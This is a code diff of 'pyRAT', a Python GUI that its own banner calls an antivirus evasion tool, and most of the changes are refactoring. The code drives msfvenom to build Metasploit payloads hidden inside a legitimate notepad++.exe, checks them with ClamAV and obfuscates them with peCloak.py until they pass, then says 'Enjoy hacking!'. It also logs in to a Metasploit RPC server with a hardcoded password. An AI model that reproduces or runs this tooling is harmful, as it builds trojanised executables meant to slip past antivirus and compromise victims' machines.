@@ -67,14 +67,13 @@ def showPayloads():
   
 # Set Payload Options
 def insert_options(var):
-    
     global payload, ip, top, port , output, extra
     payload = var.get()
     raise_frame(f3)
     top=Toplevel()
     top.title('pyRAT')
     top.resizable(width=False, height=False)
-    top.geometry("+820+395")
+    top.geometry("+545+245")
     Label(top, text='Local IP Address:').pack()
     ip = Entry(top,width=22, bg="lightblue")
     ip.pack()
@@ -88,7 +87,7 @@ def insert_options(var):
     output = Entry(top, width=22, bg="lightblue")
     output.pack()
     information = Button(top, text="i", bg='lightblue', state=ACTIVE, command=lambda: [info()]).pack(side=RIGHT)
-    btn = Button(top, text="Generate Payload", bg='lightblue', state=ACTIVE, command=lambda: [validation(), cleanup(), generation_message()]).pack()
+    generate_button = Button(top, text="Generate Payload", bg='lightblue', state=ACTIVE, command=lambda: [validation(), cleanup(), generation_message()]).pack()
 
 def info():
     
@@ -155,7 +154,7 @@ def portChk():
 
 # Generate payload              
 def generation():
-    global scan, file_name, options, name, legit_file
+    global file_name, options, name
     opt = extra.get()
     options = "'" + opt + "'"
     name =  "payloads/" + output.get()
@@ -166,10 +165,9 @@ def generation():
 ############################################################################################################
 
     subprocess.Popen(['msfvenom', '-p', payload, lhost, lport, options, '-f', 'exe', '-x', legit_file, '-o', file_name], stdout=subprocess.PIPE).communicate()[0]
-    yolo = Label(f3, text='Press the "Scan file for virus" button. It will begin the scanning with ClamAV.')
-    yolo.place(x=2,y=5)
-    scan = Button(root,text="Scan file for virus", bg='lightblue', state=ACTIVE, command=lambda: [clamscan(),rm(scan), raise_frame(f4)])
-    scan.place(relx=0.5, rely=0.96,anchor=CENTER)   
+    Scan_label = Label(f3, text='Press the "Scan file for virus" button. It will begin the scanning with ClamAV.').place(x=2,y=5)
+    scan_button = Button(root,text="Scan file for virus", bg='lightblue', state=ACTIVE, command=lambda: [clamscan(),rm(scan_button), raise_frame(f4)])
+    scan_button.place(relx=0.5, rely=0.96,anchor=CENTER)   
    
    
 def clamscan():
@@ -177,58 +175,54 @@ def clamscan():
     tkMessageBox.showinfo("Loading...", "An attacker has to be patient...Wait for a few seconds after pressing the button in order for the scanning to be completed!")
     check()
     
-# Show success message after hiding
-def success():
-          tkMessageBox.showinfo("Final Check...","Wait and see the ClamAV's results... ")
-          final()
 
 
 def check():
           # Check with pyclamd if file is infected
           daemon = pyclamd.ClamdUnixSocket()
-          cwd = os.getcwd()
+          cwd = os.getcwd() # Get current working directory
           virus_name = cwd + "/" + file_name
           results = daemon.scan_file(virus_name)    
           
           if results:   
-                raise_frame(f4)
-                rm(scan)
                 process = subprocess.Popen(['clamscan', file_name], stdout=subprocess.PIPE)
                 stdout = process.communicate()[0]
                 Label(f4,text='Payload scanned:  {}'.format(stdout)).place(x=2,y=5)
-                
                 tkMessageBox.showinfo("File infected!!!", "MALWARE : %s" % results)               
-    	        Label(f4, text="Now we have to hide the payload in order to bypass the AVs!").place(x=2,y=240)
-                enc = Button(root,text="Hide Payload", bg='lightblue', state=ACTIVE, command=lambda:[peCloak(),rm(enc)])
-                enc.place(relx=0.5, rely=0.96,anchor=CENTER)
+    	        Label(f4, text="Now we have to hide the payload in order to bypass the AVs!").place(x=2,y=280)
+                encode_button = Button(root,text="Hide Payload", bg='lightblue', state=ACTIVE, command=lambda:[peCloak(), rm(encode_button)])
+                encode_button.place(relx=0.5, rely=0.96,anchor=CENTER)
                 
           else:
                 tkMessageBox.showinfo("Awesome!!!","File is clean. Wait and see the ClamAV's results... ")
-		raise_frame(f4)
                 process = subprocess.Popen(['clamscan', file_name], stdout=subprocess.PIPE)
                 stdout = process.communicate()[0]
                 Label(f4,text='Payload scanned: {}'.format(stdout)).place(x=2,y=5)
-                Label(f4, text="The payload is now ready for the attack. Enjoy hacking!").place(x=2,y=240)
-          
-                adios = Button(root,text="Quit", bg='lightblue', state=ACTIVE, command=quit)
-                adios.place(relx=0.5, rely=0.96,anchor=CENTER)
+                Label(f4, text="The payload is now ready for the attack. Enjoy hacking!").place(x=2,y=280)
+                quit_button = Button(root,text="Quit", bg='lightblue', state=ACTIVE, command=quit)
+                quit_button.place(relx=0.5, rely=0.96,anchor=CENTER)
 
-
-    
+# Hide payload with peCloak.py    
 def peCloak():
           subprocess.Popen("python peCloak.py " + file_name, shell=True).wait()
           success()
 
-def final():          
+
+# Show success message after hiding
+def success():
+          tkMessageBox.showinfo("Final Check...","Wait and see the final ClamAV's results... ")
+          final_results()
+
+# Final results after scanning the obfuscated payload
+def final_results():          
           fname = name + "_pyRAT.exe"
           raise_frame(f5)
           process = subprocess.Popen(['clamscan', fname], stdout=subprocess.PIPE)
           stdout = process.communicate()[0]
           Label(f5,text='Payload scanned: {}'.format(stdout)).place(x=2,y=5)
-          Label(f5, text="The payload is now ready for the attack. Enjoy hacking!").place(x=2,y=240)
-          
-          adios = Button(root,text="Quit", bg='lightblue', state=ACTIVE, command=quit)
-          adios.place(relx=0.5, rely=0.96,anchor=CENTER)
+          Label(f5, text="The payload is now ready for the attack. Enjoy hacking!").place(x=2,y=280)
+          quit_button = Button(root,text="Quit", bg='lightblue', state=ACTIVE, command=quit)
+          quit_button.place(relx=0.5, rely=0.96,anchor=CENTER)
 
 ###############################
 # Main program starts here :) #
@@ -244,7 +238,7 @@ if __name__ == "__main__":
   
 	root=Tk()
 	root.title("pyRAT")
-	root.geometry("560x560+630+260")
+	root.geometry("560x560+350+110")
         root.resizable(width=False, height=False)
         root.configure(bg='lightblue')
         var = StringVar()
@@ -253,7 +247,7 @@ if __name__ == "__main__":
 	var.set("Just wait for it...")
         legit_file = 'notepad++.exe'
 
-
+        # Frames
         f = Frame(root,relief=GROOVE,width=80,height=100,bd=8)
 	f.place(x=1,y=100)
         photo = PhotoImage(file="img/raticate.png")
@@ -323,26 +317,30 @@ if __name__ == "__main__":
 	frame4.bind("<Configure>",myfunction)
 
 #######################################################
-# Run a "sudo freshclam" to update the AV database :) #
+# Run a "sudo freshclam" once a week to update the AV database :) #
 #######################################################
 
 	try: 
 	# Create a new instance of the Msfrpc client with the default options
 	   client = msfrpc.Msfrpc({})
-           #subprocess.Popen("sudo freshclam", shell=True).wait()
            subprocess.Popen("service clamav-daemon restart", shell=True).wait()
+           print	'\n=========================================================================\n'
+	   print	'|                               pyRAT                                   |\n'  
+	   print	'|                     An Antivirus Evasion Tool                         |\n'
+	   print	'|                                                                       |\n'  
+	   print	'|                       Author: Nikos Themelis                          |\n'
+	   print	'=========================================================================\n\n'
+
 	# Login to the msfmsg server using the password "abc123"
 	   client.login('msf','abc123')
 	   print(green(blink("Connection to msfrpc successful!")))
 	# Get a list of the exploits from the server and print the windows' ones
 	   mod = client.call('module.exploits')
 	except:
-	   sys.exit(red(blink("Connection Failed. Please run << msfrpcd -U msf -P abc123 -f -S -a 127.0.0.1 >> in another terminal"))) 
+	   sys.exit(red(blink("Connection Failed. Please try again!"))) 
         
-        
-
         
 	raise_frame(f)
-        mbutton = Button(root, text="Show Exploits", bg='lightblue', state=ACTIVE, command=lambda: [showExploits(), rm(mbutton),raise_frame(f1)])
-        mbutton.place(x=20, y=525)
+        first_button = Button(root, text="Show Exploits", bg='lightblue', state=ACTIVE, command=lambda: [showExploits(), rm(first_button),raise_frame(f1)])
+        first_button.place(x=20, y=525)
 	root.mainloop()
